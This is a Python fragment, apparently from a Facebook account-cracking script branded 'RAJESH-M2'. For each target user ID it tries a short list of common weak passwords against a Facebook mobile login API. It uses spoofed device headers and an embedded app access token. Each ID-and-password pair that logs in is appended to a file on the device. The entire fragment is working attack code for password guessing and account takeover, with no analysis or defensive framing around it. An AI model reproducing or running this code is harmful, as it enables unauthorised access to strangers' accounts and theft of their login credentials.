        sys.stdout.write(f"\r\r\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37müß¨ùêëùêÄùêâùêÑùêíùêá-M2\x1b[38;5;196müáÆüá≥)\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m√ó\x1b[1;37m<\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
        try:
            for pw in ('123456789', '123456', '1234567', '12345678', '1234567890'):
                with requests.Session() as session:
                    headers = {
                        'x-fb-connection-bandwidth': str(rr(20000000, 29999999)),
                        'x-fb-sim-hni': str(rr(20000, 40000)),
                        'x-fb-net-hni': str(rr(20000, 40000)),
                        'x-fb-connection-quality': 'EXCELLENT',
                        'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                        'user-agent': wind(),
                        'content-type': 'application/x-www-form-urlencoded',
                        'x-fb-http-engine': 'Liger' }
                po = (session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + str(uid) + '&password=' + str(pw) + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¬§tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=headers).json())
                if 'session_key' in str(po):
                    print(f"\r\r\x1b[38;5;196m(üåè\x1b[1;37mRAJESHüß¨\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                    open('/sdcard/RAJESH-OLD-M2-OK.txt', 'a').write(uid + '|' + pw + '\n')
                    oks.append(uid)
                    return None
                if 'session_key' in po:
                    print(f"\r\r\x1b[38;5;196m(üåè\x1b[1;37mRAJESHüß¨\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                    open('/sdcard/RAJESH-OLD-M2-OK.txt', 'a').write(uid + '|' + pw + '\n')
                    oks.append(uid)
                    return None
                continue
            loop += 1
        except Exception as e:
            return None
    BNG_71_()
    
